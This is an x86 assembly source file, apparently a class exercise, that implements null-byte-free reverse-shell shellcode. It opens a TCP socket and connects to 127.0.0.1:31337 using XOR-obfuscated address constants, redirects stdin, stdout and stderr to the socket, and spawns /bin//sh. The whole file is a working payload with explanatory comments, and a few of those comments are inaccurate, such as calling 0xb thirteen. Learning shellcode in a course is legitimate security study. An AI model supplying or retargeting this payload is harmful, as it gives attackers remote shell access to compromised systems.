
.global _start

.section .text
_start:
    # ---------------------------------------------------
    # Creating the TCP socket
    # 32 bit int $0x80 system call expects arguments in %ebx,%ecx, and %edx. It looks to %eax to specify the syscall(Ex. syscall(102) directs to socketcall())
    # ---------------------------------------------------
    push $0x66 #putting 102 into eax, will call socketcall() which will then direct socket call to sys_socket b/c we pass a 1 in ebx as argument
    xor %eax,%eax
    pop %eax
    push $1
    xor %ebx,%ebx #zeroing %ebx before using it to store 1 for sys_socket function
    pop %ebx
    xor %edx,%edx #zeroing %edx before using it as a null byte for arg list
    push %edx
    push $1 #pushing 1, TCP socket constant
    push $2 #pushing 2, AF_INET constant
    push %esp
    xor %ecx,%ecx #zeroing %ecx before using it to point to the arguments stored on stack for sys_socket AF_INET (tcp_socket = socket(AF_INET, SOCK_STREAM, 0);)
    pop %ecx
    int $0x80 # call the colonel
    push %eax # pushing socket to stack inorder to put it into edi
    xor %edi,%edi
    pop %edi
    # ---------------------------------------------------
    # Creating connecting to socket with IP and port
    # ---------------------------------------------------
    push $0x66 #putting 102 into eax, will call socketcall()
    pop %eax
    
    push $0xfffefe81 # moving 0xfffefe81 into %ebx
    pop %ebx
    xor $0xfefefefe, %ebx # 0xfffefe81 ^ 0xfefefefe = 0x100007f which is little endian for 127.0.0.1
    push %ebx # saving to stack(will use the stack to store arguments for syscall)

    push $0x7ffffffc # moving 0x7ffffffc into %ebx
    pop %ebx
    xor $0x1685fffe, %ebx # 0x7ffffffc ^ 0x1685fffe = 0x697a0002 which is little endian for port 31337 and sin_family:2(IPv4)
    push %ebx

    xor %ebx,%ebx
    push %esp # moving %esp into %ebx so that %ebx points to socket address on stack
    pop %ebx

    push $0x10 # pushing 16 b/c 16 byte socket address is on stack
    push %ebx
    push %edi # pushing socket pointer to stack

    xor %ecx,%ecx
    push %esp
    pop %ecx # ecx will hold the pointer to the arguments in order (socket pointer, address length, port, ip adress)
    xor %ebx,%ebx
    push $3
    pop %ebx # put 3 into ebx becasue we cant to call connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen)
    int $0x80 # call the colonel
    # ---------------------------------------------------
    # changing where the output of a normal command it sent by changing file descriptors
    # ---------------------------------------------------
    # initiating loop
    xor %ebx, %ebx 
    push %edi
    pop %ebx # we need socket pointer in ebx for dup2 syscall
    xor %ecx, %ecx
    push $0x2
    pop %ecx # the l.c.v. and argument for the file descriptor we want to assign to our socket in dup2 2 -> stderr, 1 -> stdout, 0 -> stdin
    xor %eax, %eax
fileDes_loop:
    push $0x3f # moving 63 into eax for dup2 system call
    pop %eax
    int $0x80 # call the colonel
    sub $0x1, %ecx
    jns fileDes_loop # loop will iterate for 2,1,0 and break after 0 becasue -1 is signed
    # ---------------------------------------------------
    # Shell code from class below
    # ---------------------------------------------------
    push $0xb #moving 13 into eax for spawning a shell
    pop %eax
    cltd # the sign extention of edx zeros out %edx
    push %edx
    push $0x68732f2f #//sh the extra '/' is convinent becasue it 4 byte aligns it and it preforms the same as '/sh'
    push $0x6e69622f #/bin
    mov %esp, %ebx
    push %edx
    push %ebx
    mov %esp, %ecx # ecx will hold the address of the arguments for syscall on the stack
    int $0x80 # call the colonel

    #-----------------------------------------------------
    #nul byte
    #//sh
    #/bin
    #nul byte
    #address to /bin//sh\x00
    #-----------------------------------------------------